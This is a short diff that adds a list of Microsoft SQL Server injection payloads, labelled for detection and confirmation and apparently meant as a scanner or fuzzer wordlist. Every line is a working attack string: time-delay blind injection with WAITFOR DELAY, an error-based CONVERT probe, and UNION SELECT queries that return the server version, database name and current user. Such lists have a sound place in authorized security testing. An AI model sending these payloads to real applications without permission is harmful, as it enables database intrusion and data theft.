@@ -1,0 +1,6 @@
+# Microsoft SQL Server-specific detection / confirmation
+1'; WAITFOR DELAY '0:0:2'--
+1); WAITFOR DELAY '0:0:2'--
+1' AND 1=CONVERT(int,'1')--
+1 UNION SELECT @@version,NULL--
+1 UNION SELECT DB_NAME(),SYSTEM_USER--
